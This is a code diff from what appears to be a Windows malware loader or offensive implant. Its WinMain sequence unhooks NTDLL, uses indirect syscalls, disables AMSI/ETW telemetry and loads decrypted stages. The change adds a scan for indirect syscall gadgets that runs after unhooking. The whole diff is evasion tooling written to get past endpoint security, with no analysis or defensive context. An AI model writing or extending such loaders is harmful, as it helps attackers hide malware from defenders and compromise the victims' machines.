@@ -28,6 +28,7 @@
 #include "Motw.h"
 #include "AntiEmul.h"
 #include "TlsCallback.h"
+#include "GadgetPool.h"
 #include "StageLoader.h"
 #include "GhostDecrypt.h"
 #include "NeuroDecrypt.h"
@@ -202,9 +203,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         Unhook::RefreshNtdll();
     }
 
-    // ── Step 1b: Initialize Direct Syscalls ──
-    if (GlobalConfig.bIndirectSyscalls)
+    // ── Step 1b: Scan for indirect syscall gadgets ──
+    // Must run AFTER unhooking for clean scan results
+    if (GlobalConfig.bIndirectSyscalls) {
+        GadgetPool::Scan();
         Syscall::Init();
+    }
 
     // ── Step 2: Telemetry Killers ──
     if (GlobalConfig.bPatchlessAmsiEtw) {
